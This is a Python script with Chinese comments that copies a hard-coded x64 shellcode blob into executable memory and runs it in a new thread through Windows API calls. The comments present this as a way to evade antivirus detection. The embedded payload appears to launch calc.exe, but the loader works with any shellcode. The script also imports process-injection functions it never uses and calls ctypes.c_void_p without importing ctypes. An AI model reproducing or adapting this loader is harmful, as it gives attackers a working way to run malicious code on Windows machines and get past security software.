#!/usr/bin/env python
# -*- coding=utf-8 -*-

# 导入模块，并给程序分配内存后可进行读写操作。
from ctypes import *
from ctypes.wintypes import *
import sys

PAGE_EXECUTE_READWRITE = 0x00000040 # 区域可执行代码，可读可写
MEM_COMMIT = 0x3000 # 分配内存
PROCESS_ALL_ACCESS = (0x00F0000 | 0x00100000 | 0xFFF) # 给予进程所有权限

# 调用Windows api，Windows中有很多内置的api，在执行shellcode时需要调用相关的API函数，在免杀过程中，许多杀毒软件会监控Windows的API，调用一些底层函数，或者少见的API函数，就可以绕过杀软的API检测。
VirtualAlloc = windll.kernel32.VirtualAlloc
RtlMoveMemory = windll.kernel32.RtlMoveMemory
CreateThread = windll.kernel32.CreateThread
WaitForSingleObject = windll.kernel32.WaitForSingleObject
OpenProcess = windll.kernel32.OpenProcess
VirtualAllocEx = windll.kernel32.VirtualAllocEx
WriteProcessMemory = windll.kernel32.WriteProcessMemory
CreateRemoteThread = windll.kernel32.CreateRemoteThread


# 将前面生成的shellcode赋值给shellcode参数，赋值前使用bytearray函数处理：
shellcode = bytearray(b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
                      b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
                      b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
                      b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
                      b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
                      b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
                      b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
                      b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
                      b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
                      b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
                      b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
                      b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
                      b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
                      b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
                      b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                      b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
                      b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
                      b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
                      b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
                      b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
                      b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
                      b"\x78\x65\x00")

# 创建一个方法并调用，申请内存，将shellcode指向分配的内存指针，再复制shellcode到内存中，创建线程事件并执行
def run1():
    VirtualAlloc.restype = ctypes.c_void_p  # 重载函数返回类型为void
    p = VirtualAlloc(c_int(0), c_int(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)   # 申请内存
    buf = (c_char * len(shellcode)).from_buffer(shellcode)  # 将shellcode指向指针
    RtlMoveMemory(c_void_p(p), buf, c_int(len(shellcode)))  # 复制shellcode到申请的内存中
    h = CreateThread(c_int(0), c_int(0), c_void_p(p), c_int(0), c_int(0), pointer(c_int(0)))    # 执行创建线程
    WaitForSingleObject(c_int(h), c_int(-1))    # 检测线程创建事件


if __name__ == '__main__':
    run1()

